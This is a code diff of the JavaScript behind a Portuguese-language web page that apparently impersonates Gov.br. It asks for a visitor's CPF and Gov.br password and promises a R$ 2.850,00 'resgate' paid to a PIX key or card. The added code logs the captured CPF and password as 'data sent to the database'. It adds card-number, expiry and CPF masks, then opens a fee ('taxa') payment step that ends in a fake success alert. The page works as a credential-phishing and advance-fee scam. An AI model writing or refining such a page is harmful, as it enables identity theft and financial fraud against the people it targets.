-                if (password.match(/[^a-zA-Z\d]/)) strength++;
-                
-                if (strength <= 1) return 'weak';
-                if (strength <= 3) return 'medium';
-                return 'strong';
-            }
-
-            // ===== NOVO: SISTEMA DE TOOLTIPS =====
-            function initTooltips() {
-                // Adicionar tooltips aos elementos existentes
-                addTooltipToElement(document.getElementById('chavePix'), 
-                    'Informe sua chave PIX (CPF, e-mail, telefone ou chave aleatória)');
-                
-                addTooltipToElement(document.getElementById('tipoChave'), 
-                    'Selecione o tipo da sua chave PIX cadastrada no seu banco');
-                
-                addTooltipToElement(document.getElementById('bancoPix'), 
-                    'Informe o nome do banco onde sua chave PIX está cadastrada');
-            }
-            
-            function addTooltipToElement(element, text) {
-                if (!element) return;
-                
-                const tooltip = document.createElement('span');
-                tooltip.className = 'tooltip';
-                tooltip.textContent = ' ⓘ';
-                
-                const tooltipText = document.createElement('span');
-                tooltipText.className = 'tooltiptext';
-                tooltipText.textContent = text;
-                
-                tooltip.appendChild(tooltipText);
-                element.parentNode.insertBefore(tooltip, element.nextSibling);
-            }
-
-            // ===== MELHORIAS NAS FUNÇÕES EXISTENTES =====
-            
-            // MELHORIA: Validação de CPF real
-            function validarCPF(cpf) {
-                cpf = cpf.replace(/\D/g, '');
-                if (cpf.length !== 11) return false;
-                
-                // Verifica se todos os dígitos são iguais
-                if (/^(\d)\1+$/.test(cpf)) return false;
-                
-                // Validação dos dígitos verificadores
-                let soma = 0;
-                for (let i = 0; i < 9; i++) {
-                    soma += parseInt(cpf.charAt(i)) * (10 - i);
-                }
-                let resto = soma % 11;
-                let digitoVerificador1 = resto < 2 ? 0 : 11 - resto;
-                
-                if (digitoVerificador1 !== parseInt(cpf.charAt(9))) return false;
-                
-                soma = 0;
-                for (let i = 0; i < 10; i++) {
-                    soma += parseInt(cpf.charAt(i)) * (11 - i);
-                }
-                resto = soma % 11;
-                let digitoVerificador2 = resto < 2 ? 0 : 11 - resto;
-                
-                return digitoVerificador2 === parseInt(cpf.charAt(10));
-            }
-
-            // MELHORIA: Validação de e-mail para chave PIX
-            function validarEmail(email) {
-                const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-                return regex.test(email);
-            }
-
-            // MELHORIA: Validação de telefone para chave PIX
-            function validarTelefone(telefone) {
-                const numero = telefone.replace(/\D/g, '');
-                return numero.length >= 10 && numero.length <= 11;
-            }
-
-            // MODIFICAÇÃO: Login form com validações melhoradas
-            if (loginForm) {
+            // Função para inicializar formulários
+            function initForms() {
+                // Processar formulário de login
                 loginForm.addEventListener('submit', function(e) {
                     e.preventDefault();
                     
                     const cpf = document.getElementById('cpf').value;
                     const senha = document.getElementById('senha').value;
                     
-                    // Validação CPF real
-                    const cpfNumerico = cpf.replace(/\D/g, '');
-                    if (!validarCPF(cpfNumerico)) {
-                        showNotification('Por favor, insira um CPF válido.', 'error');
+                    // Validação básica
+                    if (!cpf || cpf.length < 14) {
+                        alert('Por favor, insira um CPF válido.');
                         return;
                     }
                     
-                    if (!senha || senha.length < 6) {
-                        showNotification('A senha deve ter pelo menos 6 caracteres.', 'error');
+                    if (!senha) {
+                        alert('Por favor, insira sua senha do Gov.br.');
                         return;
                     }
                     
@@ -437,95 +911,145 @@
                     
                     // Simular envio para o banco de dados
                     setTimeout(function() {
-                        console.log('Tentativa de login com CPF:', cpfNumerico);
+                        // Aqui seria o código para enviar os dados para o servidor
+                        console.log('Dados enviados para o banco de dados:');
+                        console.log('CPF:', cpf);
+                        console.log('Senha:', senha);
                         
-                        // Simular falha de login em 10% dos casos
-                        if (Math.random() < 0.1) {
-                            showNotification('CPF ou senha incorretos. Tente novamente.', 'error');
-                            submitButton.style.display = 'block';
-                            loading.style.display = 'none';
-                            return;
-                        }
-                        
-                        // Login bem-sucedido
+                        // Fechar modal e mostrar página de resgate
                         loginModal.style.display = 'none';
-                        if (resgatePage) {
-                            resgatePage.style.display = 'block';
-                            resgatePage.scrollIntoView({ behavior: 'smooth' });
-                            showNotification('Login realizado com sucesso!', 'success');
-                        }
+                        resgatePage.style.display = 'block';
                         
+                        // Rolar para a página de resgate
+                        resgatePage.scrollIntoView({ behavior: 'smooth' });
+                        
+                        // Resetar o formulário
                         submitButton.style.display = 'block';
                         loading.style.display = 'none';
                         loginForm.reset();
                     }, 2000);
                 });
-            }
-
-            // MODIFICAÇÃO: Formulários de resgate com confirmação
-            if (pixForm) {
-                pixForm.addEventListener('submit', function(e) {
+                
+                // Processar formulário PIX
+                document.getElementById('pixForm').addEventListener('submit', function(e) {
                     e.preventDefault();
+                    taxaModal.style.display = 'flex';
+                });
+                
+                // Processar formulário Cartão
+                document.getElementById('cartaoForm').addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    taxaModal.style.display = 'flex';
+                });
+                
+                // Processar pagamento da taxa
+                pagarTaxaButton.addEventListener('click', function() {
+                    pagarTaxaButton.style.display = 'none';
+                    cancelarTaxaButton.style.display = 'none';
+                    taxaLoading.style.display = 'block';
                     
-                    const chavePix = document.getElementById('chavePix').value;
-                    const tipoChave = document.getElementById('tipoChave').value;
-                    
-                    // Validações específicas por tipo de chave
-                    let valido = true;
-                    let mensagemErro = '';
-                    
-                    if (tipoChave === 'cpf' && !validarCPF(chavePix.replace(/\D/g, ''))) {
-                        valido = false;
-                        mensagemErro = 'CPF inválido para chave PIX.';
-                    } else if (tipoChave === 'email' && !validarEmail(chavePix)) {
-                        valido = false;
-                        mensagemErro = 'E-mail inválido para chave PIX.';
-                    } else if (tipoChave === 'telefone' && !validarTelefone(chavePix)) {
-                        valido = false;
-                        mensagemErro = 'Telefone inválido para chave PIX.';
-                    } else if (tipoChave === 'aleatoria' && chavePix.length < 10) {
-                        valido = false;
-                        mensagemErro = 'Chave aleatória deve ter pelo menos 10 caracteres.';
-                    }
-                    
-                    if (!valido) {
-                        showNotification(mensagemErro, 'error');
-                        return;
-                    }
-                    
-                    showConfirmation(
-                        `Confirmar resgate de R$ 2.850,00 para a chave PIX: ${chavePix}?`,
-                        function() {
-                            taxaModal.style.display = 'flex';
-                        }
-                    );
+                    // Simular processamento do pagamento
+                    setTimeout(function() {
+                        alert('Pagamento realizado com sucesso! Seu resgate será processado em até 24 horas.');
+                        taxaModal.style.display = 'none';
+                        taxaLoading.style.display = 'none';
+                        pagarTaxaButton.style.display = 'block';
+                        cancelarTaxaButton.style.display = 'block';
+                    }, 3000);
+                });
+                
+                // Cancelar pagamento da taxa
+                cancelarTaxaButton.addEventListener('click', function() {
+                    taxaModal.style.display = 'none';
                 });
             }
-
-            // MODIFICAÇÃO: Pagamento com validação de cartão
-            if (cartaoForm) {
-                cartaoForm.addEventListener('submit', function(e) {
-                    e.preventDefault();
-                    
-                    const numeroCartao = document.getElementById('numeroCartao').value.replace(/\s/g, '');
-                    
-                    // Validação básica de cartão (apenas tamanho)
-                    if (numeroCartao.length !== 16) {
-                        showNotification('Número do cartão inválido.', 'error');
-                        return;
-                    }
-                    
-                    showConfirmation(
-                        `Confirmar resgate de R$ 2.850,00 para o cartão terminando em ${numeroCartao.slice(-4)}?`,
-                        function() {
-                            taxaModal.style.display = 'flex';
-                        }
-                    );
+            
+            // Função para inicializar sistema de abas
+            function initTabs() {
+                tabButtons.forEach(button => {
+                    button.addEventListener('click', () => {
+                        // Remover classe active de todos os botões e conteúdos
+                        tabButtons.forEach(btn => btn.classList.remove('active'));
+                        tabContents.forEach(content => content.classList.remove('active'));
+                        
+                        // Adicionar classe active ao botão clicado
+                        button.classList.add('active');
+                        
+                        // Mostrar o conteúdo correspondente
+                        const tabId = button.getAttribute('data-tab') + '-tab';
+                        document.getElementById(tabId).classList.add('active');
+                    });
                 });
             }
-
-            // [AS DEMAIS FUNÇÕES EXISTENTES PERMANECEM...]
-            // ... initCounters, initModals, initTabs, initMasks, etc.
+            
+            // Função para inicializar máscaras de entrada
+            function initMasks() {
+                // Máscara para CPF
+                document.getElementById('cpf').addEventListener('input', function(e) {
+                    applyCpfMask(e.target);
+                });
+                
+                // Máscaras para formulário de cartão
+                document.getElementById('numeroCartao').addEventListener('input', function(e) {
+                    applyCartaoMask(e.target);
+                });
+                
+                document.getElementById('validadeCartao').addEventListener('input', function(e) {
+                    applyValidadeMask(e.target);
+                });
+                
+                document.getElementById('cpfCartao').addEventListener('input', function(e) {
+                    applyCpfMask(e.target);
+                });
+                
+                // Função para aplicar máscara de CPF
+                function applyCpfMask(input) {
+                    let value = input.value.replace(/\D/g, '');
+                    
+                    if (value.length > 11) {
+                        value = value.substring(0, 11);
+                    }
+                    
+                    // Aplicar a máscara
+                    value = value.replace(/(\d{3})(\d)/, '$1.$2');
+                    value = value.replace(/(\d{3})(\d)/, '$1.$2');
+                    value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
+                    
+                    input.value = value;
+                }
+                
+                // Função para aplicar máscara de cartão
+                function applyCartaoMask(input) {
+                    let value = input.value.replace(/\D/g, '');
+                    
+                    if (value.length > 16) {
+                        value = value.substring(0, 16);
+                    }
+                    
+                    // Aplicar a máscara
+                    value = value.replace(/(\d{4})(\d)/, '$1 $2');
+                    value = value.replace(/(\d{4})(\d)/, '$1 $2');
+                    value = value.replace(/(\d{4})(\d)/, '$1 $2');
+                    
+                    input.value = value;
+                }
+                
+                // Função para aplicar máscara de validade
+                function applyValidadeMask(input) {
+                    let value = input.value.replace(/\D/g, '');
+                    
+                    if (value.length > 4) {
+                        value = value.substring(0, 4);
+                    }
+                    
+                    // Aplicar a máscara
+                    if (value.length >= 2) {
+                        value = value.replace(/(\d{2})(\d)/, '$1/$2');
+                    }
+                    
+                    input.value = value;
+                }
+            }
         });
     </script>
 </body>
